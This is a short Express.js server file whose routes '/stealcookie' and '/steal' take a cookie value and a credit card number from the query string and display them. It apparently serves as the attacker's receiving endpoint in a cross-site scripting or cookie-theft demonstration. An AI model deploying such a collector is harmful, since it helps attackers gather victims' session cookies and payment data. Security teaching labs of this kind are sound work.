import express from 'express';
const app = express();

app.use(express.static('public'));
app.set('view engine', 'ejs');

app.get('/stealcookie', (req, res) => {
    res.render('stealcookie', { cookie: req.query.cookie } );
});

app.get('/steal', (req, res) => {
    res.render('steal', { creditcard: req.query.creditcard } );
});


app.listen(3001);
